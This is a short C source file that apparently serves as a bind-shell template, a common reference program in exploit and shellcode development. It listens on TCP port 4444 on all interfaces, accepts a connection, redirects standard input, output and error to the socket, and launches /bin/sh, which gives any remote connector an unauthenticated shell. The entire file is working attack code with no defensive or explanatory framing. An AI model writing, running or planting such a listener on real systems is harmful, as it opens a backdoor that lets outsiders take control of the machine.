#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

int main()
{
	int host_sock = socket(AF_INET, SOCK_STREAM, 0);
	
	struct sockaddr_in host_addr;

	host_addr.sin_family = AF_INET;	
	host_addr.sin_port = htons(4444);
	host_addr.sin_addr.s_addr = INADDR_ANY;
	
	bind(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));

	listen(host_sock, 0);
	
	int client_sock = accept(host_sock, NULL, NULL);
	
	dup2(client_sock, 0);
	dup2(client_sock, 1);
	dup2(client_sock, 2);

	execve("/bin/sh", NULL, NULL);
        return 0; 
}
